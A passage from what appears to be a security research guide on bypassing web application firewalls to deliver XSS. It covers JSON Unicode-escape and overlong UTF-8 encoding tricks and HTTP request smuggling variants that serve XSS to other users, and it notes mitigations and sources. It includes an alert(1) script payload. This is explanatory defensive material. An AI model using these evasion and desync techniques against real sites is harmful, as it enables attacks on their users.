`<script>alert(1)</script>` -- JSON parsers decode these escapes automatically. WAFs inspecting the raw JSON body see Unicode escape sequences (harmless), but the parsed JSON value contains `<script>alert(1)</script>`. This is particularly effective in API contexts where JSON is the primary data format.

**Overlong UTF-8 Sequences:**
Encoding `<` as the 2-byte sequence `0xC0 0xBC` instead of the standard single byte `0x3C`. Largely blocked by modern UTF-8 validators (and specifically targeted by ModSecurity CVE-2026-52761 on 32-bit systems), but may work against legacy systems or custom parsers.

**Cross-context encoding chain (API-specific):**
Data sanitized for one context and passed to a downstream service that decodes JSON Unicode escapes creates a cross-context issue. Sanitize at the final rendering layer, not at intermediate API boundaries.

**Source:** [OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding); [Jorge Lajara WAF Bypass](https://jlajara.gitlab.io/Bypass_WAF_Unicode); [Windshock WAF Gap Analysis 2026](https://windshock.github.io/en/post/2026-03-13-waf-ips-ids-detection-gap-analysis/)

### Request Smuggling to XSS

HTTP request smuggling remains a viable XSS delivery mechanism, with James Kettle's ongoing research identifying new variants through 2025:

**TE.0 (2024):** "Exploit dechunking" targets servers that accept chunked encoding but do not properly handle a zero-length chunk, creating a new class of smuggling that bypasses previous mitigations.

**H2.CL Desync:** HTTP/2-to-HTTP/1.1 downgrading introduces Content-Length/Transfer-Encoding ambiguity. A smuggled request containing an XSS payload in a User-Agent header causes the next user's request to receive a response containing the XSS. The Netflix case study demonstrated this in production.

**Chunk-Extension TE.TE (2025, credited to Jeppe Weikop):** Exploits differences in how front-end and back-end servers handle extensions appended to chunk sizes (e.g., `0;extension`), creating desync even when both servers nominally support chunked encoding.

**Attack flow:**
1. Attacker sends smuggled request with XSS payload (e.g., in User-Agent header)
2. Front-end forwards partial request to backend
3. Backend treats leftover bytes as start of next request
4. Victim's subsequent request is appended to attacker's smuggled content
5. Response containing XSS payload is served to victim

This effectively turns reflected XSS into stored-like XSS affecting arbitrary users. End-to-end HTTP/2 or HTTP/3 eliminates the CL/TE ambiguity that enables most smuggling attacks.

**Source:** [Black Hat USA 2025 - James Kettle](https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-Wednesday.pdf); [PortSwigger Smuggling Lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
